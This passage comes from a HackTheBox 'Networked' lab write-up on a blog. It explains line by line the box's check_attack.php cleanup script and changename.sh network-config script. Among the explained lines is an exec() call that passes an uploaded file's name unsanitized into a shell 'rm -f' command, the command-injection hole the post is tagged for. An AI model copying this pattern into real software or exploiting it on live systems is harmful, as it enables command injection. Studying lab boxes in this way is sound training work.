3
4
5
6
7
</pre><td class="rouge-code"><pre> # Line 2-7
 require '/var/www/html/lib.php';
 $path = '/var/www/html/uploads/';
 $logpath = '/tmp/attack.log';
 $to = 'guly';
 $msg= '';
 $headers = "X-Mailer: check_attack.php\r\n";
</pre></table></code></div></div><li>Create an empty array called <code class="language-plaintext highlighter-rouge">files</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # Line 9
 $files = array();
</pre></table></code></div></div><li>Populate array w/ files in <code class="language-plaintext highlighter-rouge">/var/www/html/uploads</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # Line 10
 $files = preg_grep('/^([^.])/', scandir($path));
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre> # Testing what is Line 10 doing
	
 ┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit/test]
 └─# cat test.php 
 &lt;?php
 $files = preg_grep('/^([^.])/', scandir("/root/htb/networked/10.10.10.146/exploit/test/files"));
	
 foreach($files as $key){
     echo $key . "\n";
 }
 ?&gt;
 ┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit/test]
 └─# ls -la /root/htb/networked/10.10.10.146/exploit/test/files
 total 8
 drwxr-xr-x 2 root root 4096 Sep 13 02:27 .
 drwxr-xr-x 3 root root 4096 Sep 13 02:26 ..
 -rw-r--r-- 1 root root    0 Sep 13 02:27 10_10_14_19.png
 -rw-r--r-- 1 root root    0 Sep 13 02:27 asdf
 -rw-r--r-- 1 root root    0 Sep 13 02:27 testing_123.png
 -rw-r--r-- 1 root root    0 Sep 13 02:27 test.png
	
 ┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit/test]
 └─# php test.php 
 10_10_14_19.png
 asdf
 test.png
 testing_123.png
</pre></table></code></div></div><li>In this for loop, and if statement<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> # Line 12-16
 foreach ($files as $key =&gt; $value) {
         $msg='';
   if ($value == 'index.html') {
         continue;
   }
</pre></table></code></div></div><ol><li>Values in <code class="language-plaintext highlighter-rouge">$files</code> array are stored in <code class="language-plaintext highlighter-rouge">$key</code> and assign <code class="language-plaintext highlighter-rouge">$key</code> to <code class="language-plaintext highlighter-rouge">$value</code><li>If <code class="language-plaintext highlighter-rouge">$value == index.html</code>, go right back to the loop instead of proceeding to line 20 onwards.<li>The purpose is to exclude <code class="language-plaintext highlighter-rouge">index.html</code>, from code (Line 20 onwards)</ol><li>Pass <code class="language-plaintext highlighter-rouge">$value</code> into <code class="language-plaintext highlighter-rouge">getNameCheck</code> function<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> # $filename = 10_10_14_19.png
 # Screenshots are for "safe/not attacks" file (10_10_14_19.png)
 # If invalid/unsafe file (asdf) , return array("asdf",NULL)

 function getnameCheck($filename) {
   $pieces = explode('.',$filename);
   $name= array_shift($pieces);
   $name = str_replace('_','.',$name);
   $ext = implode('.',$pieces);
   return array($name,$ext);
 }
</pre></table></code></div></div><ol><li>Separates the filename into parts by <code class="language-plaintext highlighter-rouge">.</code><ul><li>for e.g. <code class="language-plaintext highlighter-rouge">10_10_14_19.png</code><li><code class="language-plaintext highlighter-rouge">$pieces[0] = 10_10_14_19.png</code><li><code class="language-plaintext highlighter-rouge">$pieces[1] = .png</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913033835.png" alt="" data-proofer-ignore></ul><li>Remove first array in <code class="language-plaintext highlighter-rouge">$pieces</code> , store it in <code class="language-plaintext highlighter-rouge">$name</code><ul><li><code class="language-plaintext highlighter-rouge">$name = 10_10_14_19</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913034200.png" alt="" data-proofer-ignore></ul><li>Replaces <code class="language-plaintext highlighter-rouge">_</code> in <code class="language-plaintext highlighter-rouge">$name</code> w/ <code class="language-plaintext highlighter-rouge">.</code><ul><li><code class="language-plaintext highlighter-rouge">10_10_14_19 to 10.10.14.19</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913033458.png" alt="" data-proofer-ignore></ul><li>Get file extension<ul><li><code class="language-plaintext highlighter-rouge">$ext = png</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913034649.png" alt="" data-proofer-ignore></ul><li>Return <code class="language-plaintext highlighter-rouge">array($name,$ext)</code></ol><li>Store array into list<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> list ($name,$ext) = getnameCheck($value);	
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913041721.png" alt="" data-proofer-ignore></p><li>Pass <code class="language-plaintext highlighter-rouge">$name, $value</code> into <code class="language-plaintext highlighter-rouge">check_ip</code> function<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre> # $name  = 10.10.14.19      = $prefix
 # $value = 10_10_14_19.png  = $filename
	
 function check_ip($prefix,$filename) {
   $ret = true;
   if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
     $ret = false;
     $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
   } else {
     $msg = $filename;
   }
   return array($ret,$msg);
 }
</pre></table></code></div></div><ol><li>Set <code class="language-plaintext highlighter-rouge">$ret = true</code><li>If IP Address is invalid,<ul><li><code class="language-plaintext highlighter-rouge">$ret = false</code><li><code class="language-plaintext highlighter-rouge">$msg=...not impt...</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913042410.png" alt="" data-proofer-ignore></ul><li>If IP Address is Valid<ul><li><code class="language-plaintext highlighter-rouge">$msg = 10_10_14_19.png</code><li><code class="language-plaintext highlighter-rouge">$ret = true</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913041225.png" alt="" data-proofer-ignore></ul><li>Return<ul><li>Valid IP: <code class="language-plaintext highlighter-rouge">array(1,"10_10_14_19.png")</code><li>Invalid IP: <code class="language-plaintext highlighter-rouge">array(false,"4tt4ck on file 10_10_14_19.png: prefix is not a valid ip")</code></ul></ol><li>If the first value in array <code class="language-plaintext highlighter-rouge">$check</code> is <code class="language-plaintext highlighter-rouge">false</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>   if (!($check[0])) {
     echo "attack!\n";e
     file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
	
     exec("rm -f $logpath");
     exec("nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;");
     echo "rm -f $path$value\n";
     mail($to, $msg, $msg, $headers, "-F$value");
   }
</pre></table></code></div></div><ol><li>Prints <code class="language-plaintext highlighter-rouge">"attack"</code><li>Append <code class="language-plaintext highlighter-rouge">$msg</code> into <code class="language-plaintext highlighter-rouge">/tmp/attack.log</code><li>Remove <code class="language-plaintext highlighter-rouge">/tmp/attack.log</code><li>Remove the invalid/unsafe file<li>Prints <code class="language-plaintext highlighter-rouge">"rm -f $path$value"</code></ol></ol><h2 id="what-is-changenamesh-doing-in-depth">What is changename.sh doing? (In-Depth) <a href="#what-is-changenamesh-doing-in-depth" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>It is assigning some variables and <strong>writing</strong> it into <code class="language-plaintext highlighter-rouge">/etc/sysconfig/network-scripts/ifcfg-guly</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF
 DEVICE=guly0
 ONBOOT=no
 NM_CONTROLLED=no
 EoF
</pre></table></code></div></div><li>Create a regex rule<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> regexp="^[a-zA-Z0-9_\ /-]+$"

 # Matches:
 1. a-z
 2. A-Z
 3. 0-9
 4. The character '_'
 5. The character '&lt;space&gt;'
 6. The character '/'
 7. The character '-' 
 8. One or MORE times
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Networked/images/Pasted%20image%2020220913192306.png" alt="" data-proofer-ignore></p><li>In every <code class="language-plaintext highlighter-rouge">for</code> loop,<ol><li>Create variable <code class="language-plaintext highlighter-rouge">$var</code>, assign it to <code class="language-plaintext highlighter-rouge">NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO</code> in each loop<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> # Loop1:
 $var = NAME
		
 # Loop2:
 $var = PROXY_METHOD
		
 # Loop3
 $var = BROWSER_ONLY
		
 # Loop4
 $var = BOOTPROTO
</pre></table></code></div></div><li>Print <code class="language-plaintext highlighter-rouge">$var</code> in each loop<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> # Example:
		
 ┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit]
 └─# for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo $var; done
 NAME
 PROXY_METHOD
 BROWSER_ONLY
 BOOTPROTO
</pre></table></code></div></div><li>Accept user input<li>Goes into a <code class="language-plaintext highlighter-rouge">while</code> loop If user input does not match regex expression, 1. Print “wrong input…” 2. Print <code class="language-plaintext highlighter-rouge">$var</code> 3. Accept user input again <strong>until user input matches regex expression</strong>.<li>Appends output of <code class="language-plaintext highlighter-rouge">$var=&lt;user input&gt;</code> into <code class="language-plaintext highlighter-rouge">ifcfg-guly</code> in each loop</ol><li>Bring interface <code class="language-plaintext highlighter-rouge">guly0</code> up.<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> /sbin/ifup guly0
</pre></table></code></div></div></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploit-file-upload-bypass/" class="post-tag no-text-decoration" >exploit/file-upload-bypass</a> <a href="/tags/exploit-command-injection/" class="post-tag no-text-decoration" >exploit/command-injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Networked - Yufong&amp;u=https://yufongg.github.io/posts/Networked/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/UpDown/"><div class="card-body"> <em class="timeago small" data-ts="1674403200" > 2023-01-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - UpDown</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, /dev/.git is discovered, since .git is found, we are able to view the logs and commits of the git repository, providing us w/ the header needed to...</p></div></div></a></div><div class="card"> <a href="/posts/OpenSource/"><div class="card-body"> <em class="timeago small" data-ts="1655827200" > 2022-06-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - OpenSource</h3><div class="text-muted small"><p> Overview This machine is hosting a webpage that allows user to test a file upload web application and download its source code. However, the source code is archived together with a directory .git, ...</p></div></div></a></div><div class="card"> <a href="/posts/Cronos/"><div class="card-body"> <em class="timeago small" data-ts="1661184000" > 2022-08-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Cronos</h3><div class="text-muted small"><p> Overview This machine begins w/ a DNS enumeration, revealing several subdomains. After enumerating the subdomains, admin.cronos.htb is susceptible to SQLi authentication bypass and a command injec...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SwagShop/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - SwagShop</p></a> <a href="/posts/Jarvis/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Jarvis</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Networked/'; this.page.identifier = '/posts/Networked/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
